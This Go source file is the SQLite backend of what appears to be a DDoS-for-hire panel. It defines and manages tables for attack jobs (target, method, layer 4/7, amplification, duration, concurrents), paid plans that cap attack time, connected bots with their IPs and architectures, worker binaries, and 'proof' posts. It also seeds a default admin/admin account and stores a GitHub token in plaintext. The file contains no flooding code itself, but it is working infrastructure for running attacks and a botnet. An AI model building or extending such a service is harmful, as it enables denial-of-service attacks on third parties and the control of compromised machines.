package main

import (
	"database/sql"
	"log"
	"os"
	"time"

	_ "modernc.org/sqlite"
)

type SQLiteBackend struct {
	db *sql.DB
}

func (s *SQLiteBackend) Init() error {
	os.MkdirAll(dbPath, 0755)
	var err error
	s.db, err = sql.Open("sqlite", dbPath+"/data.db?_pragma=journal_mode(WAL)&_pragma=busy_timeout(5000)")
	if err != nil {
		return err
	}
	s.db.SetMaxOpenConns(1)
	s.execDB(`CREATE TABLE IF NOT EXISTS users (
		id TEXT PRIMARY KEY, username TEXT UNIQUE NOT NULL, email TEXT NOT NULL,
		password TEXT NOT NULL, rule TEXT NOT NULL DEFAULT 'User', plan TEXT NOT NULL DEFAULT 'Free',
		join_date TEXT NOT NULL, expiration_date TEXT,
		max_concurrents INTEGER NOT NULL DEFAULT 1, max_seconds INTEGER NOT NULL DEFAULT 300,
		api_key TEXT NOT NULL, avatar_url TEXT DEFAULT ''
	)`)
	s.execDB(`CREATE TABLE IF NOT EXISTS plans (
		name TEXT PRIMARY KEY, max_concurrents INTEGER NOT NULL DEFAULT 1,
		max_seconds INTEGER NOT NULL DEFAULT 60, min_seconds INTEGER NOT NULL DEFAULT 10,
		premium INTEGER NOT NULL DEFAULT 0, api_access INTEGER NOT NULL DEFAULT 0
	)`)
	s.execDB(`CREATE TABLE IF NOT EXISTS methods (
		method TEXT PRIMARY KEY, description TEXT DEFAULT '',
		layer4 INTEGER NOT NULL DEFAULT 0, layer7 INTEGER NOT NULL DEFAULT 0,
		amplification INTEGER NOT NULL DEFAULT 0, premium INTEGER NOT NULL DEFAULT 0,
		concurrents INTEGER NOT NULL DEFAULT 1, proxy INTEGER NOT NULL DEFAULT 0
	)`)
	s.execDB(`CREATE TABLE IF NOT EXISTS attacks (
		attack_id TEXT PRIMARY KEY, target TEXT NOT NULL, method TEXT NOT NULL,
		layer TEXT DEFAULT '', time_total INTEGER NOT NULL DEFAULT 30,
		time_remaining INTEGER NOT NULL DEFAULT 30, concurrents INTEGER NOT NULL DEFAULT 1,
		rpc INTEGER NOT NULL DEFAULT 0, username TEXT NOT NULL,
		start_time TEXT NOT NULL, port TEXT DEFAULT '',
		proxy INTEGER NOT NULL DEFAULT 0
	)`)
	s.execDB(`CREATE TABLE IF NOT EXISTS bot_connections (
		id TEXT PRIMARY KEY, ip TEXT NOT NULL, arch TEXT DEFAULT '',
		cpu INTEGER NOT NULL DEFAULT 1, username TEXT DEFAULT '',
		online INTEGER NOT NULL DEFAULT 1, last_seen TEXT NOT NULL
	)`)
	s.execDB(`CREATE TABLE IF NOT EXISTS proofs (
		id TEXT PRIMARY KEY, type TEXT NOT NULL, url TEXT NOT NULL,
		caption TEXT DEFAULT '', created_by TEXT NOT NULL, created_at TEXT NOT NULL
	)`)
	s.execDB(`CREATE TABLE IF NOT EXISTS broadcasts (
		id TEXT PRIMARY KEY, text TEXT NOT NULL, end_time TEXT NOT NULL,
		media_url TEXT DEFAULT '', caption TEXT DEFAULT '',
		created_by TEXT NOT NULL, created_at TEXT NOT NULL
	)`)
	s.execDB(`CREATE TABLE IF NOT EXISTS sessions (
		token TEXT PRIMARY KEY, username TEXT NOT NULL
	)`)
	s.execDB(`CREATE TABLE IF NOT EXISTS workers (
		id TEXT PRIMARY KEY, server_id TEXT NOT NULL, server_ip TEXT DEFAULT '',
		worker_type TEXT DEFAULT '', status TEXT DEFAULT 'offline',
		pid INTEGER DEFAULT 0, port INTEGER DEFAULT 0,
		binary_path TEXT DEFAULT '', last_heartbeat TEXT DEFAULT '',
		created_at TEXT DEFAULT '', installed_by TEXT DEFAULT ''
	)`)
	s.execDB(`CREATE TABLE IF NOT EXISTS github_config (
		id TEXT PRIMARY KEY DEFAULT 'main', repo_url TEXT DEFAULT '',
		token TEXT DEFAULT '', branch TEXT DEFAULT 'main',
		file_path TEXT DEFAULT 'master.json', enabled INTEGER DEFAULT 0
	)`)
	s.migrateAttacksProxy()
	s.migrateJSON()
	s.seedAdminUser()
	return nil
}

func (s *SQLiteBackend) execDB(sql string, args ...interface{}) {
	if _, err := s.db.Exec(sql, args...); err != nil {
		log.Fatalf("db exec error: %v\nsql: %s", err, sql)
	}
}

func (s *SQLiteBackend) mustExec(sql string, args ...interface{}) {
	if _, err := s.db.Exec(sql, args...); err != nil {
		log.Printf("db exec error: %v", err)
	}
}

func (s *SQLiteBackend) migrateAttacksProxy() {
	rows, err := s.db.Query("PRAGMA table_info(attacks)")
	if err != nil { return }
	defer rows.Close()
	for rows.Next() {
		var cid int; var name, ctype string; var notnull, pk int; var dflt sql.NullString
		rows.Scan(&cid, &name, &ctype, &notnull, &dflt, &pk)
		if name == "proxy" { return }
	}
	s.mustExec("ALTER TABLE attacks ADD COLUMN proxy INTEGER NOT NULL DEFAULT 0")
}

func (s *SQLiteBackend) migrateJSON() {
	var users map[string]struct {
		ID, Username, Email, Password, Rule, Plan                             string
		JoinDate, ExpirationDate, APIKey, AvatarURL                           string
		MaxConcurrents, MaxSeconds                                            int
	}
	if loadJSON(dbPath+"/users.json", &users) == nil && len(users) > 0 {
		tx, _ := s.db.Begin()
		stmt, _ := tx.Prepare(`INSERT OR IGNORE INTO users (id,username,email,password,rule,plan,join_date,expiration_date,max_concurrents,max_seconds,api_key,avatar_url) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)`)
		for _, u := range users {
			stmt.Exec(u.ID, u.Username, u.Email, u.Password, u.Rule, u.Plan, u.JoinDate, u.ExpirationDate, u.MaxConcurrents, u.MaxSeconds, u.APIKey, u.AvatarURL)
		}
		stmt.Close()
		tx.Commit()
	}
	var plans map[string]struct {
		Name                                string
		MaxConcurrents, MaxSeconds, MinSeconds int
		Premium, APIAccess                  bool
	}
	if loadJSON(dbPath+"/plans.json", &plans) == nil && len(plans) > 0 {
		tx, _ := s.db.Begin()
		stmt, _ := tx.Prepare(`INSERT OR IGNORE INTO plans (name,max_concurrents,max_seconds,min_seconds,premium,api_access) VALUES (?,?,?,?,?,?)`)
		for _, p := range plans {
			prem, api := 0, 0
			if p.Premium { prem = 1 }
			if p.APIAccess { api = 1 }
			stmt.Exec(p.Name, p.MaxConcurrents, p.MaxSeconds, p.MinSeconds, prem, api)
		}
		stmt.Close()
		tx.Commit()
	}
}

func (s *SQLiteBackend) seedAdminUser() {
	var count int
	s.db.QueryRow("SELECT COUNT(*) FROM users").Scan(&count)
	if count > 0 {
		loadData()
		return
	}
	admin := User{
		ID: generateID(), Username: "admin", Email: "admin@admin.com",
		Password: hashPassword("admin"), Rule: "Admin", Plan: "Ultimate",
		JoinDate: time.Now().Format(time.RFC3339), MaxConcurrents: 999, MaxSeconds: 86400, APIKey: generateToken(),
	}
	SaveUser(admin)
	free := Plan{Name: "Free", MaxConcurrents: 1, MaxSeconds: 300, MinSeconds: 10}
	SavePlan(free)
	loadData()
}

func (s *SQLiteBackend) SaveUser(u User) error {
	users.Store(u.Username, u)
	s.mustExec("INSERT OR REPLACE INTO users (id,username,email,password,rule,plan,join_date,expiration_date,max_concurrents,max_seconds,api_key,avatar_url) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
		u.ID, u.Username, u.Email, u.Password, u.Rule, u.Plan, u.JoinDate, u.ExpirationDate, u.MaxConcurrents, u.MaxSeconds, u.APIKey, u.AvatarURL)
	return nil
}

func (s *SQLiteBackend) GetUserByUsername(username string) (User, bool) {
	v, ok := users.Load(username)
	if !ok {
		return User{}, false
	}
	return v.(User), true
}

func (s *SQLiteBackend) DeleteUser(username string) error {
	users.Delete(username)
	s.mustExec("DELETE FROM users WHERE username=?", username)
	return nil
}

func (s *SQLiteBackend) GetAllUsers() ([]User, error) {
	rows, err := s.db.Query("SELECT id,username,email,password,rule,plan,join_date,expiration_date,max_concurrents,max_seconds,api_key,avatar_url FROM users ORDER BY join_date DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	us := make([]User, 0)
	for rows.Next() {
		var u User
		rows.Scan(&u.ID, &u.Username, &u.Email, &u.Password, &u.Rule, &u.Plan, &u.JoinDate, &u.ExpirationDate, &u.MaxConcurrents, &u.MaxSeconds, &u.APIKey, &u.AvatarURL)
		us = append(us, u)
	}
	return us, nil
}

func (s *SQLiteBackend) SavePlan(p Plan) error {
	plans.Store(p.Name, p)
	prem, api := 0, 0
	if p.Premium {
		prem = 1
	}
	if p.APIAccess {
		api = 1
	}
	s.mustExec("INSERT OR REPLACE INTO plans (name,max_concurrents,max_seconds,min_seconds,premium,api_access) VALUES (?,?,?,?,?,?)",
		p.Name, p.MaxConcurrents, p.MaxSeconds, p.MinSeconds, prem, api)
	return nil
}

func (s *SQLiteBackend) DeletePlan(name string) error {
	plans.Delete(name)
	s.mustExec("DELETE FROM plans WHERE name=?", name)
	return nil
}

func (s *SQLiteBackend) GetAllPlans() ([]Plan, error) {
	rows, err := s.db.Query("SELECT name,max_concurrents,max_seconds,min_seconds,premium,api_access FROM plans")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	ps := make([]Plan, 0)
	for rows.Next() {
		var p Plan
		var prem, api int
		rows.Scan(&p.Name, &p.MaxConcurrents, &p.MaxSeconds, &p.MinSeconds, &prem, &api)
		p.Premium = prem == 1
		p.APIAccess = api == 1
		ps = append(ps, p)
	}
	return ps, nil
}

func (s *SQLiteBackend) SaveMethod(m Method) error {
	methodList.Store(m.Method, m)
	l4, l7, amp, prem, prx := 0, 0, 0, 0, 0
	if m.Layer4 {
		l4 = 1
	}
	if m.Layer7 {
		l7 = 1
	}
	if m.Amplification {
		amp = 1
	}
	if m.Premium {
		prem = 1
	}
	if m.Proxy {
		prx = 1
	}
	s.mustExec("INSERT OR REPLACE INTO methods (method,description,layer4,layer7,amplification,premium,concurrents,proxy) VALUES (?,?,?,?,?,?,?,?)",
		m.Method, m.Description, l4, l7, amp, prem, m.Concurrents, prx)
	return nil
}

func (s *SQLiteBackend) DeleteMethod(name string) error {
	methodList.Delete(name)
	s.mustExec("DELETE FROM methods WHERE method=?", name)
	return nil
}

func (s *SQLiteBackend) GetAllMethods() ([]Method, error) {
	rows, err := s.db.Query("SELECT method,description,layer4,layer7,amplification,premium,concurrents,proxy FROM methods")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	ms := make([]Method, 0)
	for rows.Next() {
		var m Method
		var l4, l7, amp, prem, prx int
		rows.Scan(&m.Method, &m.Description, &l4, &l7, &amp, &prem, &m.Concurrents, &prx)
		m.Layer4 = l4 == 1
		m.Layer7 = l7 == 1
		m.Amplification = amp == 1
		m.Premium = prem == 1
		m.Proxy = prx == 1
		ms = append(ms, m)
	}
	return ms, nil
}

func (s *SQLiteBackend) SaveOngoingAttack(a Attack) error {
	ongoingAttacks.Store(a.ID, a)
	s.mustExec("INSERT OR REPLACE INTO attacks (attack_id,target,method,layer,time_total,time_remaining,concurrents,rpc,username,start_time,port,proxy) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
		a.ID, a.Target, a.Method, a.Layer, a.TimeTotal, a.TimeRemaining, a.Concurrents, a.Rpc, a.Username, a.StartTime.Format(time.RFC3339), a.Port, boolInt(a.Proxy))
	return nil
}

func (s *SQLiteBackend) DeleteOngoingAttack(id string) error {
	ongoingAttacks.Delete(id)
	s.mustExec("DELETE FROM attacks WHERE attack_id=?", id)
	return nil
}

func (s *SQLiteBackend) GetAllOngoingAttacks() ([]Attack, error) {
	rows, err := s.db.Query("SELECT attack_id,target,method,layer,time_total,time_remaining,concurrents,rpc,username,start_time,port,proxy FROM attacks WHERE time_remaining>0")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	as := make([]Attack, 0)
	for rows.Next() {
		var a Attack
		var st string
		var prx int
		rows.Scan(&a.ID, &a.Target, &a.Method, &a.Layer, &a.TimeTotal, &a.TimeRemaining, &a.Concurrents, &a.Rpc, &a.Username, &st, &a.Port, &prx)
		a.Proxy = prx == 1
		a.StartTime, _ = timeParse(st)
		as = append(as, a)
	}
	return as, nil
}

func (s *SQLiteBackend) SaveSession(token, username string) error {
	sessions.Store(token, username)
	s.mustExec("INSERT OR REPLACE INTO sessions (token,username) VALUES (?,?)", token, username)
	return nil
}

func (s *SQLiteBackend) GetSessionUsername(token string) (string, bool) {
	v, ok := sessions.Load(token)
	if !ok {
		return "", false
	}
	return v.(string), true
}

func (s *SQLiteBackend) SaveBot(b BotConnection) error {
	botConnections.Store(b.ID, b)
	on := 0
	if b.Online {
		on = 1
	}
	s.mustExec("INSERT OR REPLACE INTO bot_connections (id,ip,arch,cpu,username,online,last_seen) VALUES (?,?,?,?,?,?,?)",
		b.ID, b.IP, b.Arch, b.CPU, b.Username, on, b.LastSeen.Format(time.RFC3339))
	return nil
}

func (s *SQLiteBackend) GetAllBots() ([]BotConnection, error) {
	rows, err := s.db.Query("SELECT id,ip,arch,cpu,username,online,last_seen FROM bot_connections")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	bs := make([]BotConnection, 0)
	for rows.Next() {
		var b BotConnection
		var on int
		var ls string
		rows.Scan(&b.ID, &b.IP, &b.Arch, &b.CPU, &b.Username, &on, &ls)
		b.Online = on == 1
		b.LastSeen, _ = timeParse(ls)
		bs = append(bs, b)
	}
	return bs, nil
}

func (s *SQLiteBackend) SaveProof(p Proof) error {
	s.mustExec("INSERT OR REPLACE INTO proofs (id,type,url,caption,created_by,created_at) VALUES (?,?,?,?,?,?)",
		p.ID, p.Type, p.URL, p.Caption, p.CreatedBy, p.CreatedAt.Format(time.RFC3339))
	return nil
}

func (s *SQLiteBackend) DeleteProof(id string) error {
	s.mustExec("DELETE FROM proofs WHERE id=?", id)
	return nil
}

func (s *SQLiteBackend) GetAllProofs() ([]Proof, error) {
	rows, err := s.db.Query("SELECT id,type,url,caption,created_by,created_at FROM proofs ORDER BY created_at DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	ps := make([]Proof, 0)
	for rows.Next() {
		var p Proof
		var ca string
		rows.Scan(&p.ID, &p.Type, &p.URL, &p.Caption, &p.CreatedBy, &ca)
		p.CreatedAt, _ = timeParse(ca)
		ps = append(ps, p)
	}
	return ps, nil
}

func (s *SQLiteBackend) SaveBroadcast(b Broadcast) error {
	s.mustExec("INSERT OR REPLACE INTO broadcasts (id,text,end_time,media_url,caption,created_by,created_at) VALUES (?,?,?,?,?,?,?)",
		b.ID, b.Text, b.EndTime, b.MediaURL, b.Caption, b.CreatedBy, b.CreatedAt.Format(time.RFC3339))
	return nil
}

func (s *SQLiteBackend) DeleteBroadcast(id string) error {
	s.mustExec("DELETE FROM broadcasts WHERE id=?", id)
	return nil
}

func (s *SQLiteBackend) GetAllBroadcasts() ([]Broadcast, error) {
	rows, err := s.db.Query("SELECT id,text,end_time,media_url,caption,created_by,created_at FROM broadcasts ORDER BY created_at DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	bs := make([]Broadcast, 0)
	for rows.Next() {
		var b Broadcast
		var ca string
		rows.Scan(&b.ID, &b.Text, &b.EndTime, &b.MediaURL, &b.Caption, &b.CreatedBy, &ca)
		b.CreatedAt, _ = timeParse(ca)
		bs = append(bs, b)
	}
	return bs, nil
}

func (s *SQLiteBackend) GetActiveBroadcasts() ([]Broadcast, error) {
	rows, err := s.db.Query("SELECT id,text,end_time,media_url,caption,created_by,created_at FROM broadcasts WHERE end_time = '' OR end_time = '-' OR end_time > datetime('now') ORDER BY created_at DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	bs := make([]Broadcast, 0)
	for rows.Next() {
		var b Broadcast
		var ca string
		rows.Scan(&b.ID, &b.Text, &b.EndTime, &b.MediaURL, &b.Caption, &b.CreatedBy, &ca)
		b.CreatedAt, _ = timeParse(ca)
		bs = append(bs, b)
	}
	return bs, nil
}

func (s *SQLiteBackend) SaveWorker(w Worker) error {
	hb := ""
	if !w.LastHeartbeat.IsZero() {
		hb = w.LastHeartbeat.Format(time.RFC3339)
	}
	ca := ""
	if !w.CreatedAt.IsZero() {
		ca = w.CreatedAt.Format(time.RFC3339)
	}
	s.mustExec("INSERT OR REPLACE INTO workers (id,server_id,server_ip,worker_type,status,pid,port,binary_path,last_heartbeat,created_at,installed_by) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
		w.ID, w.ServerID, w.ServerIP, w.WorkerType, w.Status, w.PID, w.Port, w.BinaryPath, hb, ca, w.InstalledBy)
	return nil
}

func (s *SQLiteBackend) GetAllWorkers() ([]Worker, error) {
	rows, err := s.db.Query("SELECT id,server_id,server_ip,worker_type,status,pid,port,binary_path,last_heartbeat,created_at,installed_by FROM workers ORDER BY created_at DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	ws := make([]Worker, 0)
	for rows.Next() {
		var w Worker
		var hb, ca string
		rows.Scan(&w.ID, &w.ServerID, &w.ServerIP, &w.WorkerType, &w.Status, &w.PID, &w.Port, &w.BinaryPath, &hb, &ca, &w.InstalledBy)
		w.LastHeartbeat, _ = timeParse(hb)
		w.CreatedAt, _ = timeParse(ca)
		ws = append(ws, w)
	}
	return ws, nil
}

func (s *SQLiteBackend) DeleteWorker(id string) error {
	s.mustExec("DELETE FROM workers WHERE id=?", id)
	return nil
}

func (s *SQLiteBackend) GetWorkerByID(id string) (Worker, bool) {
	row := s.db.QueryRow("SELECT id,server_id,server_ip,worker_type,status,pid,port,binary_path,last_heartbeat,created_at,installed_by FROM workers WHERE id=?", id)
	var w Worker
	var hb, ca string
	if err := row.Scan(&w.ID, &w.ServerID, &w.ServerIP, &w.WorkerType, &w.Status, &w.PID, &w.Port, &w.BinaryPath, &hb, &ca, &w.InstalledBy); err != nil {
		return Worker{}, false
	}
	w.LastHeartbeat, _ = timeParse(hb)
	w.CreatedAt, _ = timeParse(ca)
	return w, true
}

func (s *SQLiteBackend) SaveGitHubConfig(cfg GitHubConfig) error {
	en := 0
	if cfg.Enabled { en = 1 }
	s.mustExec("INSERT OR REPLACE INTO github_config (id,repo_url,token,branch,file_path,enabled) VALUES (?,?,?,?,?,?)",
		cfg.ID, cfg.RepoURL, cfg.Token, cfg.Branch, cfg.FilePath, en)
	return nil
}

func (s *SQLiteBackend) GetGitHubConfig() (GitHubConfig, error) {
	var cfg GitHubConfig
	var en int
	err := s.db.QueryRow("SELECT id,repo_url,token,branch,file_path,enabled FROM github_config WHERE id='main'").Scan(&cfg.ID, &cfg.RepoURL, &cfg.Token, &cfg.Branch, &cfg.FilePath, &en)
	if err != nil {
		return GitHubConfig{ID: "main", Branch: "main", FilePath: "master.json", Enabled: false}, nil
	}
	cfg.Enabled = en == 1
	return cfg, nil
}
